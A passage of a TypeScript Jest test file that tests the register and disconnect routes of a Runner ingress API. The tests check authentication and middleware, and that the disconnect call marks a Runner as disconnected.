      expect(registerSpy).not.toHaveBeenCalled();
    }
  });

  test("rejects a request the ingestion-key middleware left without a project", async () => {
    const result: RouteCallResult = await callRoute({
      uri: REGISTER_ROUTE,
      body: { clusterName: "prod-us" },
    });

    expect(result.nextCallCount).toBe(1);
    expect(result.thrownToNext).toBeInstanceOf(BadDataException);
    expect(registerSpy).not.toHaveBeenCalled();
  });
});

describe("POST /disconnect", () => {
  const DISCONNECT_ROUTE: string = "/disconnect";

  let markDisconnectedSpy: jest.SpyInstance;

  beforeAll(() => {
    mockRoutes.length = 0;
    new RunnerIngressAPI();
  });

  beforeEach(() => {
    jest.clearAllMocks();
    markDisconnectedSpy = jest
      .spyOn(RunnerService, "markDisconnected")
      .mockResolvedValue(undefined);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  test("marks the authenticated Runner disconnected and answers ok", async () => {
    const agentId: ObjectID = ObjectID.generate();

    const result: RouteCallResult = await callRoute({
      uri: DISCONNECT_ROUTE,
      agent: {
        id: agentId,
        projectId: ObjectID.generate(),
      } as unknown as Runner,
    });

    expect(result.nextCallCount).toBe(0);
    expect(markDisconnectedSpy).toHaveBeenCalledTimes(1);
    expect(
      (
        markDisconnectedSpy.mock.calls[0]![0] as { agentId: ObjectID }
      ).agentId.toString(),
    ).toBe(agentId.toString());
    expect(lastJsonResponse()).toEqual({ status: "ok" });
  });

  test("is authenticated like every other Runner route: no Runner on the request is an error", async () => {
    const result: RouteCallResult = await callRoute({ uri: DISCONNECT_ROUTE });

    expect(result.nextCallCount).toBe(1);
    expect(result.thrownToNext).toBeInstanceOf(BadDataException);
    expect(markDisconnectedSpy).not.toHaveBeenCalled();
  });

  test("is registered behind the Runner authorization middleware", () => {
    const route: MockRoute = matchRoute("POST", DISCONNECT_ROUTE);

    expect(route.middleware).toBe(RunnerAuthorization.isAuthorizedAgent);
  });
});
